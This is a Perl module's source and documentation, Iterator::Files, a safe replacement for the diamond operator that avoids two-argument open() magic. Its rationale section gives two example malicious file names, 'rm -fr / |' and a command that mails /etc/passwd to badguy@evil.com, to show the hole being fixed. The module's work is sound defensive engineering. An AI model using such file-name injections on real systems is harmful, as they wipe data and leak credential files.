#! perl

package Iterator::Files;

use warnings;
use strict;
use Carp;

=head1 NAME

Iterator::Files - Iterate through the contents of a list of files

=cut

our $VERSION = '1.00';
$VERSION =~ tr/_//d;

=head1 SYNOPSIS

    use Iterator::Files;

    $input = Iterator::Files->new( files => [ "foo", "bar" ] );
    while ( <$input> ) {
        ...
        warn("current file = ", $it->current_file, "\n");
    }

    # Alternatively:
    while ( $input->has_next ) {
        $line = $input->next;
        ...
    }

=head1 DESCRIPTION

Iterator::Files can be used to retrieve the contents of a series of
files as if it were one big file, in the style of the C<< <> >>
(Diamond) operator.

Just like C<< <> >> it returns the records of all files, one by one,
as if it were one big happy file. In-place editing of files is also
supported..

As opposed to the built-in C<< <> >> operator, no magic is applied to
the file names unless explicitly requested. This means that you're
protected from file names that may wreak havoc to your system when
processed through the magic of the two-argument open() that Perl
normally uses for C<< <> >>.

Iterator::Files is part of the Iterator-Diamond package.

=head1 RATIONALE

Perl has two forms of open(), one with 2 arguments and one with 3 (or
more) arguments.

The 2-argument open is magical. It opens a file for reading or writing
according to a leading '<' or '>', strips leading and trailing
whitespace, starts programs and reads their output, or writes to their
input. A filename '-' is taken to be the standard input or output of
the program, depending on whether the file is opened for reading or
writing.

The 3-argument open is strict. The second argument designates the way
the file should be opened, and the third argument contains the file
name, taken literally.

Many programs read a series of files whose names are passed as command
line argument. The diamond operator makes this very easy:

  while ( <> ) {
    ....
  }

The program can then be run as something like

  myprog *.txt

Internally, Perl uses the 2-argument open for this.

What's wrong with that?

Well, this goes horribly wrong if you have file names that trigger the
magic of Perl's 2-argument open.

For example, if you have a file named ' foo.txt' (note the leading
space), running

  myprog *.txt

will surprise you with the error message

  Can't open  foo.txt: No such file or directory

This is still reasonably harmless. But what if you have a file
'>bar.txt'? Now, silently a new file 'bar.txt' is created. If you're
lucky, that is. It can also silently wipe out valuable data.

When your system administrator runs scripts like this, malicous file
names like 'rm -fr / |' or '|mail < /etc/passwd badguy@evil.com' can
be a severe threat to your system.

After a long discussion on the perl mailing list it was felt that this
security hole should be fixed. Iterator::Files does this by
providing a decent iterator that behaves just like C<< <> >>, but with
safe semantics.

=head1 FUNCTIONS

=head2 new

Constructor. Creates a new iterator.

The iterator can be used by calling its methods, but it can also be
used as argument to the readline operator. See the examples in
L<SYNOPSIS>.

B<new> takes an optional series of key/value pairs to control the
exact way the iterator must behave.

=over 4

=item B<< magic => >> { none | stdin | all }

C<none> applies three-argument open semantics to all file names and do
not use any magic. This is the default behaviour.

C<stdin> is also safe. It applies three-argument open semantics but
allows a file name consisting of a single dash C<< - >> to mean the
standard input of the program. This is often very convenient.

C<all> applies two-argument open semantics. This makes the iteration
unsafe again, just like the built-in C<< <> >> operator.

=item B<< edit => >> I<suffix>

Enables in-place editing of files, just as the built-in C<< <> >> operator.

Unlike the built-in operator semantics, an empty suffix to discard backup
files is not supported.

=item B<< files => >> I<aref>

Use this list of files. If this is not specified, uses @ARGV.

=back

=cut

sub new {
    my ($pkg, %args) = @_;
    my $self = bless
      { _files => \@ARGV,
	_magic => "none",
	_init  => 0,
      }, $pkg;

    if ( exists $args{magic} ) {
	$self->{_magic} = lc delete $args{magic};
	croak($pkg."::new: Invalid value for 'magic' option")
	  unless $self->{_magic} =~ /^none|all|stdin$/;
    }
    if ( exists $args{edit} ) {
	$self->{_edit} = delete $args{edit};
	croak($pkg."::new: Value for 'edit' option (backup suffix) may not be empty")
	  if defined($self->{_edit}) && $self->{_edit} eq '';
    }
    if ( exists $args{files} ) {
	$self->{_files} = delete $args{files};
	croak($pkg."::new: Invalid value for 'files' option")
	  unless ref $self->{_files} eq 'ARRAY';
	$self->{_user_files} = 1;
    }
    if ( exists $args{record_separator} ) {
	$self->{_recsep} = delete $args{record_separator};
    }
    if ( exists $args{rs} ) {
	$self->{_recsep} = delete $args{rs};
    }
    if ( %args ) {
	croak($pkg."::new: Unhandled options: "
	      . join(" ", sort keys %args));
    }

    $self->{_current_file} = \my $argv;

    return $self;
}

=head2 next

Method, no arguments.

Returns the next record of the input stream, or undef if the stream is
exhausted.

=cut

sub next {
    my $self = shift;

    while ( 1 ) {

	unless ( $self->{_init} ) {
	    return unless $self->_advance;
	}

	if ( $self->{_init} ) {
	    my $line = readline($self->{_current_fh});
	    return $line if defined $line;
	    close($self->{_current_fh});
	    undef($self->{_current_fh});
	    $self->{_init} = 0;
	    undef ${ $self->{_current_file} };
	}
    }
}

sub readline {
    goto \&next unless wantarray;
    my $self = shift;
    my @lines;
    while ( $self->has_next ) {
	push(@lines, $self->next);
    }
    return @lines;
}

#### WARNING ####
# From overload.pm: Even in list context, the iterator is currently
# called only once and with scalar context.
use overload '<>' => \&readline;

sub _magic_stdin {
    my $self = shift;
    my $magic = $self->{_magic};
    return 'stdin' eq $magic || 'all' eq $magic;
}

sub _advance {
    my $self = shift;

    $self->{_init} = 1;

    if ( defined($self->{_edit}) && defined($self->{_rewrite_fh}) ) {
	close($self->{_rewrite_fh})
	  or croak("Error rewriting ", $self->current_file, ": $!");
	undef $self->{_rewrite_fh};
	select($self->{_reset_fh});
    }

    while ( 1 ) {

	unless ( @{ $self->{_files} } ) {
	    return;
	}

	${$self->{_current_file}} = shift(@{ $self->{_files} });

	if ( $self->{_magic} eq 'all'
	     || $self->{_magic} eq 'stdin' && $self->current_file eq '-' ) {
	    open($self->{_current_fh}, $self->current_file)
	      or croak($self->current_file, ": $!");
	}
	else {
	    open($self->{_current_fh}, '<', $self->current_file)
	      or croak($self->current_file, ": $!");
	}

	if ( eof($self->{_current_fh}) ) {
	    close $self->{_current_fh};
	    undef $self->{_current_fh};
	    undef ${ $self->{_current_file} };
	    CORE::next;
	}

	if ( defined $self->{_edit} ) {
	    my $fname = $self->current_file;
	    my $backup = $fname;
	    if ( $self->{_edit} !~ /\*/ ) {
		$backup .= $self->{_edit};
	    }
	    else {
		$backup =~ s/\*/$fname/g;
	    }
	    unlink($backup);
	    rename($fname, $backup)
	      or croak("Cannot rename $fname to $backup: $!");
	    open($self->{_rewrite_fh}, '>', $fname)
	      or croak("Cannot create $fname: $!");
	    $self->{_reset_fh} = select($self->{_rewrite_fh});
	}

	return 1;
    }
}

=head2 has_next

Method, no arguments.

Returns true if the stream is not exhausted. A subsequent call to
C<next> will return a defined value.

This is the equivalent of the 'eof()' function.

=cut

sub has_next {
    my $self = shift;
    !$self->is_eof || $self->_advance;
}

use overload 'bool' => \&has_next;

=head2 is_eof

Method, no arguments.

Returns true if the current file is exhausted. A subsequent call to
C<next> will open the next file if available and start reading it.

This is the equivalent of the 'eof' function.

=cut

sub is_eof {
    my $fh = shift->{_current_fh};
    !defined($fh) || eof($fh);
}

=head2 current_file

Method, no arguments.

Returns the name of the current file being processed.

=cut

sub current_file {
    ${ shift->{_current_file} };
}

=head1 LIMITATIONS

Even in list context, the iterator C<< <$input> >> is currently called
only once and with scalar context. This will not work as expected:

  my @lines = <$input>;

This reads all remaining lines:

  my @lines = $input->readline;

=head1 SEE ALSO

L<Iterator::Diamond>, open() in L<perlfun>, L<perlopentut>.

=head1 AUTHOR

Johan Vromans, C<< <jv at cpan.org> >>

=head1 BUGS

Please report any bugs or feature requests to C<bug-iterator-diamond
at rt.cpan.org>, or through the web interface at
L<http://rt.cpan.org/NoAuth/ReportBug.html?Queue=Iterator-Diamond>. I
will be notified, and then you'll automatically be notified of
progress on your bug as I make changes.

=head1 SUPPORT

You can find documentation for this module with the perldoc command.

    perldoc Iterator::Files

You can also look for information at:

=over 4

=item * RT: CPAN's request tracker

L<http://rt.cpan.org/NoAuth/Bugs.html?Dist=Iterator-Diamond>

=item * CPAN Ratings

L<http://cpanratings.perl.org/d/Iterator-Diamond>

=item * Search CPAN

L<http://search.cpan.org/dist/Iterator-Diamond>

=back

=head1 ACKNOWLEDGEMENTS

This package was inspired by a most interesting discussion of the
perl5-porters mailing list, July 2008, on the topic of the unsafeness
of two-argument open() and its use in the C<< <> >> operator.

=head1 COPYRIGHT & LICENSE

Copyright 2016,2008 Johan Vromans, all rights reserved.

This program is free software; you can redistribute it and/or modify it
under the same terms as Perl itself.

=cut

1; # End of Iterator::Files

__END__
